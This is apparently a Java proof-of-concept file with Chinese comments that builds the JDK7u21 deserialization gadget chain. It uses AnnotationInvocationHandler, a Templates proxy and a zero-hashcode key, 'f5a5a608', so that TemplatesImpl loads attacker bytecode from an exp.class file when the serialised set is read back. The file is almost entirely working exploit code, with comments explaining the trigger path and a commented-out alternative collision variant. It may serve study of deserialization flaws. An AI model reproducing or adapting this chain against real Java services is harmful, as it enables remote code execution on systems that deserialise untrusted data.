import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

/*LinkedHashSet.readObject()     其实LinkedHashSet没有readObject方法
  LinkedHashSet.add()
    ...
      TemplatesImpl.hashCode() (X)
  LinkedHashSet.add()
    ...
      Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)
          AnnotationInvocationHandler.hashCodeImpl() (X)      //计算hashcode的逻辑，我们通过传入的字符串的hashcode为0来进行利用
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()       //代理Templates.class，执行完这一步会遍历所有的无参方法，即newTransformer和getOutputProperties
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
  */
public class QUEY {
    public static void setFieldValue(Object object,String name,Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(object,value);
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));
        byte[][] bytecode = new byte[][]{bytecodes};
        setFieldValue(obj, "_bytecodes",bytecode);
        setFieldValue(obj, "_name", "zero");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());


      //令 key 的 HashCode 为 0, 这样计算出来的 HashCode 就和 value 的一模一样了
      //放入的f5a5a608的hashcode为0，
      
        Map innerMap = new HashMap();
        innerMap.put("f5a5a608", 123); // value 先随便设置一个值, 防止在 put 的时候触发 payload

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);

        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Templates.class, innerMap); // 传入 Templates.class, 因为这个接口就只有两个方法, 而且这两个方法都能够触发 payload, 更容易操作
        Templates proxy = (Templates) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Templates.class}, handler);

        HashSet set = new HashSet();
        set.add(obj);
        set.add(proxy);

        innerMap.put("f5a5a608", obj); // 放入最终的 TemplatesImpl 对象, 这里 put 会覆盖掉原来的 value

      //使用下面的就不用hashcode为0的字符串
      
      //Map map1 = new HashMap();
      //Map map2 = new HashMap();
      //map1.put("yy",proxyMap);
      //map1.put("zZ",templatesImpl);
      //map2.put("yy",templatesImpl);
      //map2.put("zZ",proxyMap);

      //Map map = new HashMap();
      //map.put(map1, 1);
      //map.put(map2, 2);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(set);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();


    }
}
